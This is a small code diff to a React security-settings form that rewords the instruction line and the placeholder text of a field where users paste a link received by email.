@@ -66,7 +66,7 @@ function Security({ id, email }) {
             </span>
           </p>
 
-          <p className="">Please enter this link paste here:</p>
+          <p className="">Please enter this email link:</p>
 
           <div className="">
             <Formik
@@ -79,7 +79,7 @@ function Security({ id, email }) {
                   <div className="">
                     <Field
                       className="lg:w-[470px] text-sm px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300"
-                      placeholder="Copy/paste in the link you received"
+                      placeholder="Please copy and then paste this link into a from (a bar) on a web page:"
                       name="skipcode"
                       type="text"
                       required
